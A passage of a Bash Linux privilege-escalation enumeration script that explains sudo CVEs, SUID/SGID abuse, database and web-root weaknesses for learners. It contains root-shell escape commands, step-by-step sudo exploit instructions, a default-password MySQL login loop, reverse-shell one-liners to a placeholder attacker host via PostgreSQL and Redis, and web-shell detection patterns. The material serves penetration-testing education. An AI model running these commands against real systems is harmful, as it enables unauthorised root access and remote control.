                critical "Sudo vulnerable to CVE-2025-32463 - Privilege escalation"
                vuln "sudo < 1.9.16p1 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2025-32463 - Recent Sudo Vulnerability"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A vulnerability in sudo versions before 1.9.16p1 that allows"
                teach "  privilege escalation to root."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  Sudo contains a flaw in how it processes certain commands or"
                teach "  environment variables, allowing attackers to bypass security"
                teach "  checks and execute commands as root."
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check exploit availability:"
                teach "     searchsploit sudo 2025"
                teach "  2. Download exploit:"
                teach "     https://www.exploit-db.com/exploits/52352"
                teach "  3. Compile and run (follow exploit instructions)"
                teach ""
                teach "IMPACT: Instant root access from any user account"
                log ""
            fi
        fi
        
        # CVE-2023-22809 - sudoedit bypass (1.8.0 to 1.9.12p1)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -eq 8 ] || ([ "$minor" -eq 9 ] && [ "$patch" -le 12 ]); then
                critical "Sudo vulnerable to CVE-2023-22809 - sudoedit bypass"
                vuln "sudo 1.8.0 - 1.9.12p1 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2023-22809 - Sudoedit Arbitrary File Write"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  sudoedit is a special mode that lets users edit files as root."
                teach "  This CVE tricks sudoedit into editing files you're not supposed"
                teach "  to have access to, like /etc/sudoers or /etc/shadow."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  sudoedit uses the EDITOR environment variable to launch your"
                teach "  text editor. The vulnerability occurs because sudo doesn't"
                teach "  properly validate what file you're editing when you pass"
                teach "  extra arguments to the editor via the EDITOR variable."
                teach ""
                teach "THE CLEVER TRICK:"
                teach "  Normally: sudoedit /etc/motd (you can only edit motd)"
                teach "  Exploit: EDITOR='vim -- /etc/sudoers' sudoedit /etc/motd"
                teach "  Result: Opens /etc/sudoers instead of /etc/motd!"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if you have sudoedit access:"
                teach "     sudo -l | grep sudoedit"
                teach "  2. Set malicious EDITOR:"
                teach "     export EDITOR='vim -- /etc/sudoers'"
                teach "  3. Run sudoedit on an allowed file:"
                teach "     sudoedit /etc/motd"
                teach "  4. sudoedit will open /etc/sudoers instead"
                teach "  5. Add yourself: yourusername ALL=(ALL) NOPASSWD: ALL"
                teach "  6. Save and exit"
                teach "  7. Now run: sudo /bin/bash"
                teach ""
                teach "IMPACT: Can edit ANY file as root, leading to complete system"
                teach "         compromise by modifying /etc/sudoers or /etc/shadow"
                log ""
            fi
        fi
        
        # CVE-2021-3156 - Baron Samedit (< 1.9.5p2)
        if [ "$major" -eq 1 ]; then
            if [ "$minor" -lt 9 ] || ([ "$minor" -eq 9 ] && [ "$patch" -lt 5 ]); then
                critical "Sudo vulnerable to Baron Samedit (CVE-2021-3156) - Heap overflow"
                vuln "sudo < 1.9.5p2 vulnerable"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2021-3156 - Baron Samedit (Heap Buffer Overflow)"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  A heap-based buffer overflow in sudo that allows any local"
                teach "  user to gain root WITHOUT needing a password or sudo access."
                teach "  One of the most critical sudo vulnerabilities ever found."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  When sudo processes command-line arguments, it needs to handle"
                teach "  backslashes (\\) specially. There's a bug in how it counts"
                teach "  backslashes when a command runs in 'shell mode' (with -s or -i)."
                teach ""
                teach "THE TECHNICAL FLAW:"
                teach "  1. Sudo allocates a buffer (memory) to store the command"
                teach "  2. When processing backslashes, it miscounts the length needed"
                teach "  3. This causes sudo to write PAST the end of the buffer (overflow)"
                teach "  4. By carefully crafting the overflow, attacker controls memory"
                teach "  5. Attacker overwrites function pointers to execute their code"
                teach "  6. Since sudo runs as root, the attacker's code runs as root"
                teach ""
                teach "WHY IT'S CALLED BARON SAMEDIT:"
                teach "  Play on words: 'Sudo edit' → 'Baron Samedit'"
                teach "  The vulnerability is in sudoedit, a symlink to sudo"
                teach ""
                teach "HOW TO EXPLOIT:"
                teach "  1. Check if vulnerable:"
                teach "     sudoedit -s / (if you get usage error = vulnerable)"
                teach "  2. Download exploit:"
                teach "     https://github.com/blasty/CVE-2021-3156"
                teach "     https://github.com/worawit/CVE-2021-3156"
                teach "  3. Compile the exploit (usually a C program):"
                teach "     gcc exploit.c -o exploit"
                teach "  4. Run it:"
                teach "     ./exploit"
                teach "  5. Get root shell"
                teach ""
                teach "WHY IT WORKS:"
                teach "  • No sudo privileges needed (any user can exploit)"
                teach "  • No password required"
                teach "  • Works on most Linux distributions"
                teach "  • Vulnerability existed for 10+ years (since 2011)"
                teach ""
                teach "IMPACT: Any user → Root, no credentials needed"
                log ""
            fi
        fi
        
        # CVE-2019-14287 - Runas bypass (< 1.8.28)
        if [ "$major" -eq 1 ] && [ "$minor" -eq 8 ] && [ "$patch" -lt 28 ]; then
            critical "Sudo vulnerable to CVE-2019-14287 - User ID bypass"
            vuln "sudo < 1.8.28 vulnerable"
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2019-14287 - Sudo Runas User ID Bypass"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  A logic bug that lets you run commands as root even when the"
            teach "  sudoers file explicitly says you CAN'T run as root."
            teach ""
            teach "WHY IT EXISTS:"
            teach "  Sudo allows you to run commands as different users with -u flag."
            teach "  Example: sudo -u www-data whoami (runs as www-data)"
            teach ""
            teach "  In sudoers, you might see:"
            teach "  user ALL=(ALL, !root) /bin/bash"
            teach ""
            teach "  This means: 'user can run bash as ANYONE except root'"
            teach "  The !root is supposed to block running as root for safety."
            teach ""
            teach "THE BUG:"
            teach "  Sudo uses numeric user IDs internally (UID). Root is UID 0."
            teach "  When you specify -u#-1, sudo converts -1 to unsigned int."
            teach "  In programming: -1 as unsigned = 4294967295"
            teach "  Sudo then wraps this around and interprets it as UID 0 (root)!"
            teach ""
            teach "  It's like odometer rollback:"
            teach "  -1 → wraps around → becomes 0 (root)"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check if you have Runas permissions:"
            teach "     sudo -l"
            teach "  2. Look for: (ALL, !root) or (ALL:ALL, !root)"
            teach "  3. Instead of 'sudo -u root bash' (blocked), run:"
            teach "     sudo -u#-1 /bin/bash"
            teach "  4. The -1 gets converted to UID 0 (root)"
            teach "  5. You get root shell"
            teach ""
            teach "EXAMPLE:"
            teach "  $ sudo -l"
            teach "  User bob may run the following commands:"
            teach "      (ALL, !root) /bin/bash"
            teach ""
            teach "  $ sudo -u root /bin/bash"
            teach "  Sorry, user bob is not allowed to execute '/bin/bash' as root"
            teach ""
            teach "  $ sudo -u#-1 /bin/bash"
            teach "  # whoami"
            teach "  root"
            teach ""
            teach "IMPACT: Bypass explicit !root restrictions in sudoers"
            log ""
        fi
        
        # CVE-2019-18634 - pwfeedback overflow (1.7.1 to 1.8.30)
        if [ "$major" -eq 1 ]; then
            if ([ "$minor" -eq 7 ] && [ "$patch" -ge 1 ]) || ([ "$minor" -eq 8 ] && [ "$patch" -le 30 ]); then
                warn "Sudo potentially vulnerable to CVE-2019-18634 - Buffer overflow"
                info "Requires pwfeedback enabled in sudoers (uncommon)"
                log ""
                teach "╔════════════════════════════════════════════════════════════╗"
                teach "║  CVE-2019-18634 - Password Feedback Buffer Overflow"
                teach "╚════════════════════════════════════════════════════════════╝"
                teach ""
                teach "WHAT IT IS:"
                teach "  When pwfeedback is enabled, sudo shows asterisks (*) as you"
                teach "  type your password. A buffer overflow in this feature allows"
                teach "  privilege escalation."
                teach ""
                teach "WHY IT EXISTS:"
                teach "  The pwfeedback feature displays * for each character typed."
                teach "  Sudo allocates a fixed-size buffer to store these asterisks."
                teach "  If you type more characters than the buffer can hold, it"
                teach "  overflows, potentially allowing code execution as root."
                teach ""
                teach "IMPORTANT: This is UNCOMMON"
                teach "  pwfeedback is disabled by default in most Linux distributions."
                teach "  It must be explicitly enabled in /etc/sudoers:"
                teach "  Defaults pwfeedback"
                teach ""
                teach "HOW TO CHECK IF EXPLOITABLE:"
                teach "  1. Check sudoers config:"
                teach "     sudo -l"
                teach "  2. Look for 'pwfeedback' in the output"
                teach "  3. Or check the file directly:"
                teach "     grep pwfeedback /etc/sudoers /etc/sudoers.d/*"
                teach ""
                teach "HOW TO EXPLOIT (if pwfeedback enabled):"
                teach "  1. Download exploit from exploit-db or GitHub"
                teach "  2. Compile it"
                teach "  3. Run it - exploit sends many characters to overflow buffer"
                teach ""
                teach "IMPACT: Local privilege escalation IF pwfeedback is enabled"
                log ""
            fi
        fi
        
        ok "Sudo version checked against known CVEs"
        log ""
        teach "═══════════════════════════════════════════════════════════════"
        teach "GENERAL SUDO SECURITY TIPS:"
        teach "═══════════════════════════════════════════════════════════════"
        teach ""
        teach "Why sudo is a common target:"
        teach "  • Runs with root privileges by design"
        teach "  • Complex codebase (150,000+ lines of C)"
        teach "  • Handles authentication, parsing, environment variables"
        teach "  • Backward compatibility = old code paths still exist"
        teach "  • Written in C = memory safety issues possible"
        teach ""
        teach "How to find sudo exploits:"
        teach "  1. Check version: sudo -V | head -1"
        teach "  2. Search exploit-db: searchsploit sudo [version]"
        teach "  3. GitHub: Search 'sudo CVE-[year]'"
        teach "  4. Check sudo permissions: sudo -l"
        teach ""
        teach "Defense (as admin):"
        teach "  • Keep sudo updated (sudo --version)"
        teach "  • Principle of least privilege (specific commands, not ALL)"
        teach "  • Avoid NOPASSWD where possible"
        teach "  • Monitor sudo logs: /var/log/auth.log"
        log ""
    else
        info "sudo not installed"
    fi
}
enum_sudo2() {
    log "${COLOR_PURPLE}[SUDO PERMISSIONS]${COLOR_RESET}"
    if sudo -l 2>&1 | grep -v "not allowed"; then
        critical "Sudo access confirmed"
        return 0
    else
        warn "No sudo access"
        return 1
    fi
}
# === SUID BINARY ANALYSIS ===
enum_suid() {
    section "SUID BINARY ANALYSIS"
    
    explain_concept "SUID Bit" \
        "SUID allows a program to run with the file owner's privileges. If owner is root, program runs as root regardless of who executes it." \
        "Legitimate use: /usr/bin/passwd needs root to modify /etc/shadow. Dangerous: Custom SUID binaries may have vulnerabilities, call other programs unsafely, or have shell escape features." \
        "Attack vectors:\n  1. Binary spawns a shell directly\n  2. Binary calls other programs without absolute paths (PATH hijacking)\n  3. Binary has buffer overflow or other memory corruption\n  4. Binary has command injection vulnerability"
    
    # Comprehensive whitelist of legitimate SUID binaries
    local legit_suid=(
        "/usr/bin/passwd" "/usr/bin/sudo" "/usr/bin/su" "/bin/su"
        "/usr/bin/chsh" "/usr/bin/chfn" "/usr/bin/gpasswd" "/usr/bin/newgrp"
        "/usr/bin/mount" "/usr/bin/umount" "/bin/mount" "/bin/umount"
        "/usr/bin/fusermount" "/usr/bin/fusermount3" "/bin/fusermount"
        "/usr/bin/ntfs-3g" "/bin/ntfs-3g"
        "/bin/ping" "/bin/ping6" "/usr/bin/ping" "/usr/bin/ping6"
        "/usr/bin/newuidmap" "/usr/bin/newgidmap"
        "/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic"
        "/usr/lib/snapd/snap-confine"
        "/usr/bin/pkexec"
        "/usr/lib/policykit-1/polkit-agent-helper-1"
        "/usr/lib/polkit-1/polkit-agent-helper-1"
        "/usr/lib/dbus-1.0/dbus-daemon-launch-helper"
        "/usr/lib/xorg/Xorg.wrap"
        "/usr/lib/openssh/ssh-keysign"
        "/usr/bin/at"
        "/usr/sbin/pppd"
    )
    
    find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -4000 -type f -print 2>/dev/null | while read suid_bin; do
        local is_legit=0
        
        for legit in "${legit_suid[@]}"; do
            if [ "$suid_bin" = "$legit" ]; then
                is_legit=1
                break
            fi
        done
        
        if [ $is_legit -eq 0 ]; then
            vuln "Non-standard SUID binary: $suid_bin"
            
            local owner=$(stat -c %U "$suid_bin" 2>/dev/null)
            local perms=$(stat -c %a "$suid_bin" 2>/dev/null)
            log "  Owner: $owner | Permissions: $perms"
            
            local file_type=$(file "$suid_bin" 2>/dev/null)
            if echo "$file_type" | grep -q "script"; then
                warn "  Script with SUID bit - kernel ignores this"
                log ""
                continue
            fi
            
            log ""
            local basename=$(basename "$suid_bin")
            
            case $basename in
                vim|vi)
                    critical "SUID vim/vi - Shell escape available"
                    teach "  $suid_bin -c ':!/bin/bash -p'"
                    teach "  Or: $suid_bin then :set shell=/bin/bash then :shell"
                    ;;
                    
                nano)
                    critical "SUID nano - Command execution via Control-R Control-X"
                    teach "  $suid_bin then Ctrl+R Ctrl+X then type: reset; bash -p"
                    ;;
                    
                find)
                    critical "SUID find - Execute commands via -exec"
                    teach "  $suid_bin . -exec /bin/bash -p \\; -quit"
                    ;;
                    
                python*|python)
                    critical "SUID python - Direct shell spawn"
                    teach "  $suid_bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                    ;;
                    
                perl)
                    critical "SUID perl - Execute shell"
                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\";'"
                    ;;
                    
                ruby)
                    critical "SUID ruby - Spawn privileged shell"
                    teach "  $suid_bin -e 'exec \"/bin/bash\", \"-p\"'"
                    ;;
                    
                node|nodejs)
                    critical "SUID node - Child process spawn"
                    teach "  $suid_bin -e 'require(\"child_process\").spawn(\"/bin/bash\", [\"-p\"], {stdio: [0,1,2]})'"
                    ;;
                    
                bash|sh|zsh|dash)
                    critical "SUID shell - Direct root access"
                    teach "  $suid_bin -p"
                    ;;
                    
                awk|gawk|nawk)
                    critical "SUID awk - System call execution"
                    teach "  $suid_bin 'BEGIN {system(\"/bin/bash -p\")}'"
                    ;;
                    
                less|more)
                    critical "SUID less/more - Shell escape via bang"
                    teach "  $suid_bin /etc/profile then type: !/bin/bash -p"
                    ;;
                    
                env)
                    critical "SUID env - Execute arbitrary binary"
                    teach "  $suid_bin /bin/bash -p"
                    ;;
                    
                systemctl)
                    critical "SUID systemctl - Shell escape via pager"
                    teach "  $suid_bin status trail.service"
                    teach "  Wait for pager then type: !bash -p"
                    ;;
                    
                yum)
                    critical "SUID yum - Plugin exploitation for root shell"
                    teach "  TF=\$(mktemp -d)"
                    teach "  echo 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' > \$TF/x.py"
                    teach "  $suid_bin -c \"exec=python \$TF/x.py\" --plugins=\$TF"
                    ;;
                    
                apt|apt-get)
                    critical "SUID apt - Execute commands via APT Pre-Invoke"
                    teach "  $suid_bin update -o APT::Update::Pre-Invoke::=/bin/sh"
                    ;;
                    
                git)
                    teach "  $suid_bin help status then in pager: !sh"
                    ;;
                    
                tar)
                    critical "SUID tar - Checkpoint action execution"
                    teach "  $suid_bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
                    ;;
                    
                make)
                    critical "SUID make - Execute Makefile commands"
                    teach "  $suid_bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
                    ;;
                    
                *)
                    teach "  Analysis steps:"
                    teach "    1. Check GTFOBins: https://gtfobins.github.io/"
                    teach "    2. strings $suid_bin | grep -E 'system|exec|popen'"
                    teach "    3. ltrace $suid_bin 2>&1 | grep -E 'system|exec'"
                    teach "    4. Check for PATH hijacking if it calls commands without full paths"
                    ;;
            esac
            log ""
        fi
    done
}
# === SGID BINARIES ===
enum_sgid() {
    section "SGID BINARY ANALYSIS"
    
    explain_concept "SGID Bit" \
        "SGID (Set Group ID) is like SUID but for groups. The program runs with the file's group privileges." \
        "Less common than SUID for privilege escalation, but if SGID binary is in 'shadow' or 'docker' group, it can be exploited." \
        "Look for SGID binaries in privileged groups, then analyze like SUID binaries."
    
        find / \( -path "*/containers/storage/*" -o -path /proc -o -path /sys -o -path /dev \) -prune -o -perm -2000 -type f -print 2>/dev/null | head -20 | while read sgid_bin; do
        local group=$(stat -c %G "$sgid_bin" 2>/dev/null)
        case $group in
            shadow|docker|disk|sudo)
                vuln "SGID binary in privileged group '$group': $sgid_bin"
                teach "  This binary runs with $group privileges"
                ;;
        esac
    done
}

# ═══════════════════════════════════════════════════
# EXTENDED MODULES (--extended flag)
# ═══════════════════════════════════════════════════

# === DATABASE ENUMERATION ===
enum_databases() {
    [ $EXTENDED -eq 0 ] && return
    
    section "DATABASE ENUMERATION"
    
    explain_concept "Database Privilege Escalation" \
        "Databases often run as root or privileged users. Weak credentials or UDF exploits can lead to command execution." \
        "MySQL/PostgreSQL allow file operations and command execution via User Defined Functions or built-in features. MariaDB/MySQL running as root + FILE privilege = read/write any file. PostgreSQL COPY FROM/TO can read/write files." \
        "Attack paths:\n  • Default credentials (root:root, root:password)\n  • Credentials in config files\n  • UDF exploitation for MySQL\n  • COPY FROM PROGRAM for PostgreSQL\n  • NoSQL injection for MongoDB"
    
    # Check for MySQL
    if command -v mysql >/dev/null 2>&1; then
        info "MySQL client is installed"
        
        # Try common credential combinations
        local mysql_creds=("root:" "root:root" "root:password" "root:toor")
        for cred in "${mysql_creds[@]}"; do
            local user=$(echo "$cred" | cut -d: -f1)
            local pass=$(echo "$cred" | cut -d: -f2)
            
            if [ -z "$pass" ]; then
                if mysql -u"$user" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with NO PASSWORD - Instant privilege escalation possible"
                    vuln "MySQL accessible with no password: $user"
                    teach "Exploitation:"
                    teach "  mysql -u$user -e 'SELECT LOAD_FILE(\"/etc/shadow\")'"
                    teach "  Or use UDF to execute commands if running as root"
                fi
            else
                if mysql -u"$user" -p"$pass" -e "SELECT 1" 2>/dev/null | grep -q "1"; then
                    critical "MySQL root access with default password: $user:$pass"
                    vuln "MySQL accessible with default password: $user:$pass"
                fi
            fi
        done
        
        # Check for socket
        if [ -S /var/run/mysqld/mysqld.sock ]; then
            info "MySQL socket found at /var/run/mysqld/mysqld.sock"
            if [ -w /var/run/mysqld/mysqld.sock ]; then
                critical "MySQL socket is WRITABLE - Connect without credentials"
                vuln "MySQL socket is WRITABLE!"
                teach "Connect without credentials if file permissions allow"
            fi
        fi
    fi
    
    # Check for PostgreSQL
    if command -v psql >/dev/null 2>&1; then
        info "PostgreSQL client is installed"
        
        # Try connection
        if psql -U postgres -c "SELECT 1" 2>/dev/null | grep -q "1"; then
            critical "PostgreSQL accessible as postgres - Command execution via COPY TO PROGRAM"
            vuln "PostgreSQL accessible as postgres user"
            teach "PostgreSQL exploitation:"
            teach "  COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"'"
            teach "  Or read files: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd';"
        fi
    fi
    
    # Check for MongoDB
    if command -v mongo >/dev/null 2>&1 || command -v mongosh >/dev/null 2>&1; then
        info "MongoDB client is installed"
        warn "MongoDB often runs without authentication by default"
        teach "Try: mongo --eval 'db.version()'"
        teach "Then enumerate databases and collections"
    fi
    
    # Check for Redis
    if command -v redis-cli >/dev/null 2>&1; then
        info "Redis client is installed"
        if redis-cli ping 2>/dev/null | grep -q "PONG"; then
            critical "Redis accessible without auth - Write cron jobs or SSH keys"
            vuln "Redis is accessible without authentication!"
            explain_concept "Redis Exploitation" \
                "Redis is an in-memory database often used for caching. Unauthenticated access allows arbitrary command execution." \
                "Redis CONFIG SET allows changing server configuration, including setting the working directory and writing files. You can write SSH keys or cron jobs." \
                "Exploitation:\n  redis-cli config set dir /var/spool/cron/\n  redis-cli config set dbfilename root\n  redis-cli set x '\\n* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\n'\n  redis-cli save"
        fi
    fi
}

#!/bin/bash

# === ENHANCED WEB APPLICATION ENUMERATION ===
enum_web() {
    [ $EXTENDED -eq 0 ] && return
    
    section "WEB APPLICATION ENUMERATION"
    
    # === PHASE 1: SILENT SCAN - Collect findings ===
    local found_writable_webroot=0
    local found_writable_uploads=0
    local found_credentials=0
    local found_web_shells=0
    local found_wordpress=0
    local found_frameworks=0
    local found_logs_with_creds=0
    
    local temp_writable_roots="/tmp/.learnpeas_web_roots_$$"
    local temp_writable_uploads="/tmp/.learnpeas_web_uploads_$$"
    local temp_configs="/tmp/.learnpeas_web_configs_$$"
    local temp_shells="/tmp/.learnpeas_web_shells_$$"
    local temp_wordpress="/tmp/.learnpeas_wordpress_$$"
    local temp_frameworks="/tmp/.learnpeas_frameworks_$$"
    local temp_log_creds="/tmp/.learnpeas_log_creds_$$"
    
    # Cleanup function
    cleanup_web_temps() {
        rm -f "$temp_writable_roots" "$temp_writable_uploads" "$temp_configs" \
              "$temp_shells" "$temp_wordpress" "$temp_frameworks" "$temp_log_creds" 2>/dev/null
    }
    trap cleanup_web_temps RETURN
    
    # Check common web roots
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    local checked_dirs=()
    
    for webroot in "${web_roots[@]}"; do
        # Skip if already checked this or a parent
        local skip=0
        for checked in "${checked_dirs[@]}"; do
            if [[ "$webroot" == "$checked"* ]]; then
                skip=1
                break
            fi
        done
        [ $skip -eq 1 ] && continue
        
        if [ -d "$webroot" ]; then
            checked_dirs+=("$webroot")
            
            # === CHECK 1: Writable Web Root ===
            if [ -w "$webroot" ]; then
                echo "$webroot" >> "$temp_writable_roots"
                found_writable_webroot=1
            fi
            
            # === CHECK 2: Writable Upload Directories ===
            for upload_dir in "uploads" "upload" "files" "media" "assets" "images" "attachments" "documents"; do
                local upload_path="$webroot/$upload_dir"
                if [ -d "$upload_path" ] && [ -w "$upload_path" ]; then
                    # Check if .htaccess restricts PHP execution
                    local htaccess_blocks_php=0
                    if [ -f "$upload_path/.htaccess" ]; then
                        if grep -qiE "php_flag|php_admin_flag.*off|RemoveHandler.*php|RemoveType.*php" "$upload_path/.htaccess" 2>/dev/null; then
                            htaccess_blocks_php=1
                        fi
                    fi
                    
                    echo "$upload_path|$htaccess_blocks_php" >> "$temp_writable_uploads"
                    found_writable_uploads=1
                fi
            done
            
            # === CHECK 3: Configuration Files with Credentials ===
            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" \
                -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
            grep -vE "sample|example|setup-config|default-|node_modules|vendor" | head -15 | while read config; do
                if [ -r "$config" ]; then
                    # More precise credential detection - avoid false positives
                    if grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
                       grep -vE "^\s*[#;/]|example|sample|your_|changeme|<password>|password_here|PUT_|INSERT_|ENTER_" | head -3 | grep -q "."; then
                        local is_writable=$( [ -w "$config" ] && echo "1" || echo "0" )
                        echo "$config|$is_writable" >> "$temp_configs"
                        found_credentials=1
                    fi
                fi
            done
            
            # === CHECK 4: WordPress Detection ===
            if [ -f "$webroot/wp-config.php" ]; then
                local wp_readable=$( [ -r "$webroot/wp-config.php" ] && echo "1" || echo "0" )
                local wp_writable=$( [ -w "$webroot/wp-config.php" ] && echo "1" || echo "0" )
                local has_backups=0
                local has_xmlrpc=$( [ -f "$webroot/xmlrpc.php" ] && echo "1" || echo "0" )
                local has_json_api=$( [ -d "$webroot/wp-json" ] && echo "1" || echo "0" )
                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                
                # Check for wp-config backups
                if find "$webroot" -maxdepth 1 -type f \( -name "wp-config.php.bak" -o -name "wp-config.php.old" \
                    -o -name "wp-config.php~" -o -name "wp-config.php.save" \) -readable 2>/dev/null | grep -q .; then
                    has_backups=1
                fi
                
                echo "$webroot|$wp_readable|$wp_writable|$has_backups|$has_xmlrpc|$has_json_api|$plugin_count" >> "$temp_wordpress"
                found_wordpress=1
            fi
            
            # === CHECK 5: Framework Detection ===
            # Laravel
            if [ -f "$webroot/.env" ] || [ -d "$webroot/storage" ]; then
                local env_readable=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
                echo "Laravel|$webroot|$env_readable" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Django
            if [ -f "$webroot/manage.py" ] || find "$webroot" -maxdepth 2 -name "settings.py" 2>/dev/null | grep -q .; then
                local settings_file=$(find "$webroot" -maxdepth 3 -name "settings.py" -readable 2>/dev/null | head -1)
                local has_secrets=$( [ -n "$settings_file" ] && grep -qE "SECRET_KEY|DATABASE|PASSWORD" "$settings_file" 2>/dev/null && echo "1" || echo "0" )
                echo "Django|$webroot|$settings_file|$has_secrets" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Node.js/Express
            if [ -f "$webroot/package.json" ]; then
                local has_env=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
                echo "Node.js|$webroot|$has_env" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Rails
            if [ -d "$webroot/config" ] && [ -f "$webroot/config.ru" ]; then
                local db_readable=$( [ -r "$webroot/config/database.yml" ] && echo "1" || echo "0" )
                echo "Rails|$webroot|$db_readable" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # === CHECK 6: Web Server Logs with Credentials (only once, not per webroot) ===
            # Skip this check if we already processed logs
            if [ "$webroot" = "/var/www/html" ] || [ "$webroot" = "/var/www" ]; then
                for logfile in "/var/log/apache2/access.log" "/var/log/nginx/access.log" "$webroot/../logs/access.log"; do
                    if [ -r "$logfile" ]; then
                        # Check if already processed
                        if [ -f "$temp_log_creds" ] && grep -q "^$logfile$" "$temp_log_creds" 2>/dev/null; then
                            continue
                        fi
                        
                        # Look for credentials in GET parameters
                        if grep -E "(password|passwd|pwd|token|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | grep -v "password=\*\*\*\*" | tail -3 | grep -q "."; then
                            echo "$logfile" >> "$temp_log_creds"
                            found_logs_with_creds=1
                        fi
                    fi
                done
            fi
            
            # === CHECK 7: Web Shell Detection (Improved) ===
            # Whitelist of known safe files that contain suspicious patterns
            local safe_patterns="class-phpmailer\.php|class-smtp\.php|class-ftp\.php|class-ftp-sockets\.php|"
            safe_patterns+="file\.php.*wp-admin|Filesystem\.php|Process\.php|vendor/|node_modules/|"
            safe_patterns+="wp-includes/.*\.php|laravel/framework"
            
            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | \
            grep -vE "$safe_patterns" | while read phpfile; do
                local filesize=$(stat -c%s "$phpfile" 2>/dev/null || echo "0")
                
                # Skip very large files (likely legitimate)
                [ $filesize -gt 1000000 ] && continue
                
                # Check for web shell signatures with context
                local suspicious_count=0
                local has_eval=$(grep -c "eval(" "$phpfile" 2>/dev/null | head -1)
                local has_base64=$(grep -c "base64_decode" "$phpfile" 2>/dev/null | head -1)
                local has_system=$(grep -c "system(" "$phpfile" 2>/dev/null | head -1)
                local has_exec=$(grep -c "exec(" "$phpfile" 2>/dev/null | head -1)
                local has_shell_exec=$(grep -c "shell_exec(" "$phpfile" 2>/dev/null | head -1)
                local has_passthru=$(grep -c "passthru(" "$phpfile" 2>/dev/null | head -1)
                
                # Ensure all values are numeric (handle empty strings)
                has_eval=${has_eval:-0}
                has_base64=${has_base64:-0}
                has_system=${has_system:-0}
                has_exec=${has_exec:-0}
                has_shell_exec=${has_shell_exec:-0}
                has_passthru=${has_passthru:-0}
                
                # Score the file
                suspicious_count=$((has_eval + has_base64 + has_system + has_exec + has_shell_exec + has_passthru))
                
                # High confidence: Multiple dangerous functions or eval+base64 combo
                if [ $suspicious_count -ge 4 ] || { [ $has_eval -gt 0 ] && [ $has_base64 -gt 1 ]; }; then
                    # Additional check: Look for common web shell indicators (escape $ properly)
                    if grep -qE "c99|r57|b374k|wso|shell|backdoor|\\$_(GET|POST|REQUEST)" "$phpfile" 2>/dev/null; then
                        echo "$phpfile|high|$suspicious_count" >> "$temp_shells"
                        found_web_shells=1
                    fi
                # Medium confidence: 3 dangerous functions
                elif [ $suspicious_count -eq 3 ]; then
                    if grep -qE "\\$_(GET|POST|REQUEST).*(system|exec|eval)" "$phpfile" 2>/dev/null; then
                        echo "$phpfile|medium|$suspicious_count" >> "$temp_shells"
                        found_web_shells=1
                    fi
                fi
            done
        fi
    done
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    local any_issues=$((found_writable_webroot + found_writable_uploads + found_credentials + \
                        found_web_shells + found_wordpress + found_frameworks + found_logs_with_creds))
    
    if [ $any_issues -gt 0 ]; then
        explain_concept "Web Application Attacks" \
            "Web applications often store credentials, have writable directories, or run with elevated privileges." \
            "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
            "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Report writable web roots
    if [ -f "$temp_writable_roots" ]; then
        while IFS= read -r webroot; do
            critical "Web root WRITABLE - Upload shell for remote code execution"
            vuln "Web root is WRITABLE: $webroot"
            log ""
            teach "╔═══════════════════════════════════════╗"
            teach "║  Writable Web Root Exploitation"
            teach "╚═══════════════════════════════════════"
            teach ""
            teach "WHAT YOU CAN DO:"
            teach "  Upload a web shell to execute commands through the browser"
            teach ""
            teach "EXPLOITATION:"
